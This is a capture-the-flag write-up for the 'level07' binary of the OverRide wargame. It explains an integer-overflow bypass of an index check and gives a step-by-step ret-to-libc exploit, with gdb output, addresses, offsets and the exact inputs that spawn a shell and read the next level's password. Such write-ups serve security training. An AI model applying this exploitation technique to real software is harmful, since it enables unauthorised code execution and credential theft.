# level07
## Program behaviour

1. while true, ask for `command`
2. If `command` is `"store"`
    - Ask for `number` and `index`
    - if `index % 3 != 0`, store with `memory[index] = number`
3. If `command` is `"read"`
    - Ask for `index`
    - `printf` the `number` at `memory[index]`
4. If `command` is `"quit"`
    - `break` infinite loop

## Vulnerability

Because `memory` is a `int *`, `memory[index]` is actually `*(memory + index << 2)`.
Knowing that we can bypass the `% 3` check by adding `0x40000000` to `index`, and still have the wanted `index`.
This is true because `(index + 0x40000000 << 2) == index`.

This means that the program is vulnerable to buffer-overflow attacks.

## Exploitation

Here we are going to use a ret-to-libc, although it is possible to use a shellcode (see `exploit.py` for an example).


1. Setup a dummy breakpoint to load the symbol table. Run the program and fetch the address of the `system` function and the string `"/bin/sh"`
```gdb
(gdb) b *0x08048795
Breakpoint 1 at 0x8048795
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048795 in main ()
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p/d 0xf7e6aed0
$2 = 4159090384
(gdb) find system, +99999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) p/d 0xf7f897ec
$3 = 4160264172
```

2. Find the correct offset to overwrite the saved `$eip`
```gdb
(gdb) b *0x080488ea
Breakpoint 1 at 0x80488ea
(gdb) r
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store

Breakpoint 1, 0x080488ea in main ()
(gdb) p/d $ebp+4 - ($esp + 0x24)
$4 = 456
(gdb) p/d 456/4                 
$5 = 114
```

3. Write the correct addresses at offset `114` and `116`.
    - `114` is divisible by `3` but `116` is not.
    - `114 + 0x40000000 == 1073741938`
    - `system`: `0xf7e6aed0 == 4159090384`
    - `"/bin/sh"`: `0xf7f897ec == 4160264172`
```sh
level07@OverRide:~$ ~/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
